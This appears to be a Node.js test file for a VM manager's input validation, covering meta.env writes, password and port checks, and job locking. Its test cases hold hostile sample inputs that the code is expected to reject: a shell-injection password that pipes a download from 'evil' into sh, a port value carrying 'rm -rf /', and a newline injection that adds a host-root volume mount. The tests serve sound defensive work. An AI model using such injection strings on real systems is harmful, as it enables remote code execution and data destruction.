// Values a caller supplies that end up in meta.env, a Dockerfile, a start hook
// or a port map (plan 122 #6, #7, #10, #13, #15).
const { it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pad-input-'));
process.env.WORKSPACE_ROOT = root;
process.env.PAD_DB_PATH = path.join(root, 'x.db');
const PAD = 'pad-input';
const inst = path.join(root, 'instances', PAD);
fs.mkdirSync(inst, { recursive: true });

const internal = require('../services/vm-manager/internal');
const jobLog = require('../services/job-log');

before(() => fs.writeFileSync(path.join(inst, 'meta.env'), 'AGENT=opencode\nROOT_PASSWORD=first\n'));
after(() => fs.rmSync(root, { recursive: true, force: true }));
const meta = () => fs.readFileSync(path.join(inst, 'meta.env'), 'utf8');

it('stores a value containing $ patterns exactly, on a first and on a later save', () => {
  for (const value of ['pa$$w0rd', "a$&b", "x$'y", 'p$`q', '$1$2']) {
    internal.setMetaFlag(PAD, 'ROOT_PASSWORD', value);   // replaces the existing line
    assert.ok(meta().includes(`ROOT_PASSWORD=${value}\n`), `stored ${value} verbatim, got: ${meta()}`);
  }
});

it('refuses to write a second line through a value', () => {
  assert.throws(() => internal.setMetaFlag(PAD, 'ROOT_PASSWORD', 'x\nEXTRA_VOLUMES=[{"host":"/","container":"/h"}]'), /line break/);
  assert.doesNotMatch(meta(), /EXTRA_VOLUMES/);
});

it('accepts ordinary passwords and refuses ones that can break out of where they are written', () => {
  for (const ok of ['', undefined, 'hunter2', 'pa$$w0rd!', 'with space', 'ünïcödé', 'a"b']) {
    assert.doesNotThrow(() => internal.assertRootPassword(ok));
    assert.doesNotThrow(() => internal.assertWebPassword(ok));
  }
  assert.throws(() => internal.assertRootPassword('a\nb'), /line break/);
  for (const bad of ["ab'cd", "x'; curl evil|sh; '", 'a\\b', 'a\nb', 'a\rb']) {
    assert.throws(() => internal.assertWebPassword(bad), /single quote, a backslash or a line break/, JSON.stringify(bad));
  }
});

it('accepts only a real port number', () => {
  for (const ok of ['', undefined, '22', 2222, '65535']) assert.doesNotThrow(() => internal.assertPort(ok));
  for (const bad of ['0', '65536', '22; rm -rf /', '2222 ', 'abc', '-1', '1e3']) assert.throws(() => internal.assertPort(bad, 'SSH port'), /SSH port must be a number/, String(bad));
});

it('a finished job cannot delete the newer job that took its name', async () => {
  const first = jobLog.createJob('update:pad-x');
  jobLog.finish(first, true);                 // schedules first's cleanup timer
  const second = jobLog.createJob('update:pad-x'); // a new build under the same key
  assert.notEqual(first, second);
  // Fire the first job's cleanup now instead of waiting five minutes.
  first.cleanupTimer._onTimeout();
  assert.equal(jobLog.getJob('update:pad-x'), second, 'the running job is still there');
});

it('refuses a second change set for a PAD while one is still being applied', async () => {
  const apply = require('../services/vm-manager/settings-apply');
  // The PAD in this fixture has no container, so the first apply is slow to
  // fail (it asks docker); the second must be refused at once, before that.
  const first = apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
  const second = await apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
  assert.equal(second.code, 'pad_change_in_progress');
  assert.equal(second.status, 409);
  await first;
  // And the lock is released afterwards, whatever the first one's outcome.
  const third = await apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
  assert.notEqual(third && third.code, 'pad_change_in_progress');
});
